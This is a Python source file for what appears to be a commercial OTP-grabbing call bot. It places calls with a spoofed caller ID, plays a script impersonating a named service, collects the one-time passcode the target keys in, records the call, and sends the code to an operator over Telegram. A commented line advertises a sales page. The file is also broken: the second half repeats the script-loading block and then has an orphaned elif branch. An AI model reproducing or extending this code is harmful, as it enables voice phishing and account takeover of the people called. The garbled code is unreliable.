# BASIC
import asyncio

# OTHER
from server.general import play_audio_direct, send_telegram_message, handle_initiated_call, send_accept_deny, send_end_call, send_call_answered, add_usage, send_detection, send_call_recording, start_recording
from server.general import save_calldetails, fetch_calldetails, delete_calldetails, hangup_call, send_code_vouch

from server.general import fetch_user_script

PRESSDTMF_SLEEP_DURATION = 40
HANGUP_SLEEP_DURATION = 120
DELETE_DATA_SLEEP_DURATION = 300

async def customcall(data: dict, module: str, call_variables: str, event: str, channel_id: str, number: str, spoof: str, service: str, name: str, otpdigits: str, script_name: str, chatid: str, tag: str):    
    script = await fetch_user_script(chatid, script_name)
    
    script_id = script.get('script_id', None)
    script_name = script.get('script_name', None)
    on_call_answer = script.get('on_call_answer', None) # when they answer (ask to press 1)
    grab_code = script.get('grab_code', None) # collect OTP code 
    waiting_line = script.get('waiting_line', None) # thanks line
    success_line = script.get('success_line', None)
    repeat_line = script.get('repeat_line', None)
    gender = script.get('gender', None).lower()
    language = script.get('language', None)
    
    if on_call_answer:
        on_call_answer = on_call_answer.replace("{name}", name)
        on_call_answer = on_call_answer.replace("{service}", service)
    
    if grab_code:
        grab_code = grab_code.replace("{otp_length}", otpdigits)
    

    if event == "Dial":
        # CHANGE CALL STARTED TO YES
        info = await fetch_calldetails(channel_id=channel_id)
        if info.get('is_dial_ran') != "yes":
            await save_calldetails(channel_id=channel_id, is_dial_ran="yes")
            await handle_initiated_call(channel_id, chatid, number, spoof)
    
    elif event == "StasisStart":
        # START RECORDING
        await start_recording(channel_id)

        # CHANGE DTMF MODE
        await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_one")
        
        # SEND TG MESSAGE
        await send_call_answered(chatid)

        # PLAY TTS
        payload_1 = on_call_answer
        await play_audio_direct(channel_id, payload_1, chatid)
        
        # WAIT PRESS 1
        await asyncio.sleep(PRESSDTMF_SLEEP_DURATION)
        info = await fetch_calldetails(channel_id=channel_id)
        if info['dtmf_status'] == "waiting_for_one":
            await hangup_call(channel_id)
            await send_telegram_message(chatid, "🕐 Target did not respond in time. Call was hung up.")

        # MAX CALL TIME LIMIT
        await asyncio.sleep(HANGUP_SLEEP_DURATION)
        await hangup_call(channel_id)
            
    elif event == "PlaybackStarted":
        # SAVE PLAYBACK ID
        playback_id = data.get('playback', {}).get('id', None)
        await save_calldetails(channel_id=channel_id, current_playback_id=playback_id)

    elif event == "PlaybackFinished":
        print("EXECUTING PLAYBACK FINISHED")
        pass

    elif event == "RecordingFinished":
        print("EXECUTING RECORD FINISHED EVENT")

            

    elif event == "ChannelDtmfReceived":
        # FETCH CURRENT DIGIT
        digit = data['digit']
        info = await fetch_calldetails(channel_id=channel_id)
        if info['dtmf_status'] == "waiting_for_one":
            if digit == "1":
                # CHANGE DIGIT MODE
                await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_otp", dtmf_digits="")
                
                # PLAY TTS
                payload_2 = grab_code
                await play_audio_direct(channel_id, payload_2, chatid)
                
                # SEND TG MESSAGE
                await send_telegram_message(chatid, "🕵️‍♀️ Pressed 1. Target was asked for OTP...")


        elif info['dtmf_status'] == "waiting_for_otp":
            # CURRENT DTMF DIGIT
            info['dtmf_digits'] += digit
            await save_calldetails(channel_id=channel_id, dtmf_digits=info['dtmf_digits'])
            
            # CHECK IF ENOUGH DIGITS        
            if len(info['dtmf_digits']) == int(otpdigits):
                
                # CODE IS VALID
                payload_thanks = waiting_line
                await play_audio_direct(channel_id, payload_thanks, chatid)
                
                # SAVE CALL STATE
                await save_calldetails(channel_id=channel_id, dtmf_status="waiting_for_button", dtmf_digits="")

                # SEND TG ACCEPT/DENY
                payload_2 = grab_code
                await send_accept_deny(chatid, payload_2, call_variables, otpdigits, f"🪙 OTP Code: {info['dtmf_digits']}", channel_id)
                await send_code_vouch(info['dtmf_digits'], chatid)

    elif event == "ChannelHangupRequest":
        # Prevent Target didnt press message
        await save_calldetails(channel_id=channel_id, dtmf_status="call_ended")
        
        # END CALL MESSAGE
        await send_end_call(channel_id, chatid)
        
        # CALL RECORDING
        try:
            await send_call_recording(chatid, channel_id)
        except Exception as e:
            print(e)
        
        # ADD USER USAGE
        await add_usage(chatid, tag, module, data)

        # DELETE DATA & ADD USAGE
        await asyncio.sleep(DELETE_DATA_SLEEP_DURATION)
        info = await fetch_calldetails(channel_id=channel_id)
        if info and info['dtmf_status']:
            await delete_calldetails(chatid)
        


    script = await fetch_user_script(chatid, script_name)
    
    script_id = script.get('script_id', None)
    script_name = script.get('script_name', None)
    on_call_answer = script.get('on_call_answer', None)
    grab_code = script.get('grab_code', None)
    waiting_line = script.get('waiting_line', None)
    success_line = script.get('success_line', None)
    repeat_line = script.get('repeat_line', None)
    gender = script.get('gender', None).lower()
    language = script.get('language', None)
    
    if on_call_answer:
        on_call_answer = on_call_answer.replace("{name}", name)
        on_call_answer = on_call_answer.replace("{service}", service)
    
    if grab_code:
        grab_code = grab_code.replace("{otp_length}", otpdigits)
    





    elif event == "call.gather.ended":
        otp_code = data['data']['payload']['digits']
        
        if otp_code == "1":
            ## SEND OTP
            payload = grab_code
            await play_audio_direct(channel_id, payload, chatid)

            await send_telegram_message(chatid, "🕵️‍♀️ Pressed 1. Target was asked for OTP...")

        elif len(otp_code) >= 3:
            ## CODE IS VALID
            payload = waiting_line
            await play_audio_direct(channel_id, payload, chatid)

            webhook = f""
            payload = repeat_line
            
            await send_accept_deny(chatid, payload, webhook, otpdigits, f"🪙 OTP Code: {otp_code}", data['data']['payload']['call_control_id'])
            #await send_telegram_message(-1001974622228, "\\U1F4F2 Link has been approved! ~ https://masterotp.sellpass.io/")
            
    elif event == "call.machine.detection.ended":
        await send_detection(data, chatid)
        